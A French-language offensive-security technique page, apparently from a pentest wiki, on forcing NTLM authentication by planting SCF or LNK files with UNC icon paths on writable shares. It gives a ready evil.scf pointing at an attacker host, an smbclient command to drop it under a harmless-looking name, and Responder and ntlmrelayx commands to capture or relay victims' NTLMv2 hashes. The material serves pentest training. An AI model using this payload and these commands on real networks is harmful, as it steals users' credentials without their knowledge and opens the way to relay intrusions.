---
title: "Coercition SCF et LNK : forcer l'authentification lors de la consultation d'un dossier"
order: 1
description: "Les fichiers SCF et LNK placés sur un partage inscriptible peuvent référencer une icône ou une cible par chemin UNC sur un hôte attaquant. Lorsqu'un utilisateur se contente de consulter le dossier dans l'Explorateur, le client résout ces références et s'authentifie auprès de l'attaquant, capturant le hash NTLM ou alimentant un relais NTLM, sans qu'aucun fichier ne soit ouvert ou exécuté."
keywords:
  - scf file
  - lnk file
  - unc path
  - responder
  - ntlm coercion
---

# Coercition SCF et LNK

La technique d'empoisonnement de partage la plus fiable ne nécessite l'ouverture ou l'exécution d'aucun fichier : elle se déclenche quand un utilisateur consulte simplement le dossier. L'Explorateur résout certains attributs de fichier pour afficher un dossier, et si ces attributs pointent vers un chemin UNC sur un hôte attaquant, le client s'y connecte et s'y authentifie. Les fichiers SCF (Shell Command File) et LNK (raccourci) portent tous deux une référence d'icône ; une bibliothèque Windows/un connecteur de recherche ou un desktop.ini peuvent faire de même. Déposer un tel fichier dans un partage inscriptible signifie que tout utilisateur qui consulte le répertoire s'authentifie auprès de l'attaquant, dont la capture ou le relais transforme cela en hash NTLM de la victime ou en session relayée.

## Déposer le fichier de coercition

```ini
; evil.scf  -- Explorer resolves IconFile via UNC on folder view
[Shell]
Command=2
IconFile=\\<attacker-ip>\share\icon.ico
[Taskbar]
Command=ToggleDesktop
```

```bash
# drop it where users browse (name it to sort to the top, e.g. a leading ~ or @)
smbclient //<t>/share -U 'user%pass' -c 'put evil.scf @readme.scf'
# an LNK with a UNC icon path achieves the same; set the icon location to \\attacker\x
# stand up capture/relay on the attacker host to receive the authentication:
responder -I eth0                              # capture NTLMv2 for offline cracking
impacket-ntlmrelayx -tf targets.txt -smb2support   # relay it to a signing-off host
```

Lorsque l'Explorateur affiche le dossier, il récupère l'icône depuis le chemin UNC, ce qui amène le client à effectuer une authentification SMB auprès de l'attaquant ; l'attaquant capture la réponse NTLMv2 (cassée hors ligne) ou la relaie en direct vers un autre hôte.

## Notes d'exploitation

- Le déclencheur est la consultation du dossier, et non l'ouverture d'un fichier, ce qui rend cette technique bien plus fiable que les techniques de macro ou d'exécutable : quiconque navigue vers le partage dans l'Explorateur la déclenche.
- Le NTLMv2 capturé est cassé hors ligne si le mot de passe est faible, ou relayé immédiatement vers un hôte qui n'exige pas la signature ; associez-le à la [signature et au relais](../signing-and-relay.md).
- La coercition par icône SCF a été restreinte sur les Windows corrigés/modernes dans certains contextes, alors conservez les variantes LNK (icône UNC), bibliothèque/`.library-ms` et `desktop.ini` comme alternatives ; le mécanisme (résolution UNC à l'affichage) est le même.
- Nommez le fichier pour qu'il se classe en premier et qu'il paraisse inoffensif afin qu'il soit affiché rapidement ; l'identifiant capturé est celui de l'utilisateur qui consulte.

## Outils

- [Responder](https://github.com/lgandx/Responder)
- [Impacket ntlmrelayx](https://github.com/fortra/impacket)
- [ntlm_theft (générateur de fichiers de coercition)](https://github.com/Greenwolf/ntlm_theft)

## Références

- [MITRE ATT&CK : authentification forcée](https://attack.mitre.org/techniques/T1187/)
- [MITRE ATT&CK : altération de contenu partagé](https://attack.mitre.org/techniques/T1080/)
